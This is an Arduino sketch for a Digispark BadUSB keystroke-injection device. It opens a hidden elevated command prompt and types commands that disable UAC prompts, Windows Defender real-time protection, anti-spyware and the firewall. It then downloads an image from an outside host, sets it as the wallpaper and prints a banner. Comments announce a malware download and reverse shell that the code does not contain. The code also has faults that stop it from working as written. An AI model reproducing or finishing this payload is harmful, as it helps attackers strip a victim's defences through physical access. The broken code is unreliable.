#include "DigisparkKeyboard.h"
// Get out of my code!!!!!!
// How did u even get this????
void setup() {
  // Net setup (i dont speak russian)
}

void ChangeWallpaper() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("$client = new-object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("$client.DownloadFile(\"https://images2.alphacoders.com/105/1056786.jpg\" , \"wallpaper.jpg\")"); // insert link here
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("reg add \"HKCU\\Control Panel\\Desktop\" /v WallPaper /d \"%USERPROFILE%\\wallpaper.jpg\" /f");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
void runcmd(char cmd) {
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell Start-Process cmd -Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_ALT_LEFT);
  DigiKeyboard.print(cmd);
  DigiKeyboard.delay(1000);
}

void loop() {
  digitalWrite(1, HIGH)
  // Start
  //------------------------------------------------------
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(0);
  // Opening cmd and obfuscating
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell Start-Process cmd -Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
  //Obfuscating cmd tab
  DigiKeyboard.print("mode con:cols=18 lines=1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("color FE");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  // Automate Turn-Off - Windows UAC, Windows Firewall, and Windows Defender
  // Also automate to Download the malware and connect with Reverse Shell
  // Disabling the User Access Control
  DigiKeyboard.print("Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin -Value 0");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  // Disabling the Firewall Part 1
  DigiKeyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  // Disabling the Firewall Part 2
  DigiKeyboard.print("Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  // Disabling the Virus and Threat Protection
  DigiKeyboard.print("New-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  // Exiting powershell
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  ChangeWallpaper();
  char banner = "  ___                       _   _              ____                           _    ____  ____   _____        __\n |_ _|    __ _ _ __ ___    | |_| |__   ___    / ___|_ __ ___  ___ _ __       / \\  |  _ \\|  _ \\ / _ \\ \\      / /\n  | |    / _` | '_ ` _ \\   | __| '_ \\ / _ \\  | |  _| '__/ _ \\/ _ \\ '_ \\     / _ \\ | |_) | |_) | | | \\ \\ /\\ / / \n  | |   | (_| | | | | | |  | |_| | | |  __/  | |_| | | |  __/  __/ | | |   / ___ \\|  _ <|  _ <| |_| |\\ V  V /  \n |___|   \\__,_|_| |_| |_|   \\__|_| |_|\\___|   \\____|_|  \\___|\\___|_| |_|  /_/   \\_\\_| \\_\\_| \\_\\\\___/  \\_/\\_/   \n";
  runcmd("echo \"" + banner + "\"");
  // -----------------------------------------------------
  // END
  digitalWrite(1, LOW);
  for (;;) {
    // Stops script from el re-runningo
  }
}
